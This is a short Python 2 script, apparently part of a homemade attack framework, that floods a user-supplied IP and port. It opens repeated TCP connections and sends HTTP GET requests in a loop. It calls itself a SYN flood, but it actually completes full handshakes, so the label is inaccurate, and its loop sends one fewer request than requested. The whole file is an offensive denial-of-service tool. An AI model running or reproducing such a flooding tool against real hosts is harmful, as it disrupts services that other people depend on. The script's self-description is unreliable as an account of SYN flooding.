#!/usr/bin/python

#
# Description: Script to SYN-Flooding target ip and port
# address
#
###############################
# Log:
# 2015/12/13    S.S - Initial
# 2015/12/14    S.S - Version 1.0 implemented
# 2015/12/14	S.S - help()-function implemented
################################


import os
import sys
import subprocess
import socket
import attackBase

class SYNFlooding(attackBase.Attack):

	attackedHost = ""
	attackedPort = 80
	numberOfAttacks = 0

	def start(self):
		self.attackedHost = raw_input("Please enter IP of attacked host: ")
		self.attackedPort = int(raw_input("Please enter attacked destination port: "))
		self.numberOfAttacks = int(raw_input("Please enter how many times would you like to send syn packets: "))
		print "Attacked Host: " + self.attackedHost + " on TCP port: " + str(self.attackedPort)
		for i in range(1, self.numberOfAttacks):
			self.flooding(i)
		
	def flooding(self, i):
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.connect((self.attackedHost, self.attackedPort))
		print "SYN flooding packet number " + str(i)
		sock.send("GET / HTTP/1.1\r\n")
		sock.send("Host: " + self.attackedHost + "\r\n\r\n")
		sock.close()
		
		
		

	def help(self):
		print "ToDo"
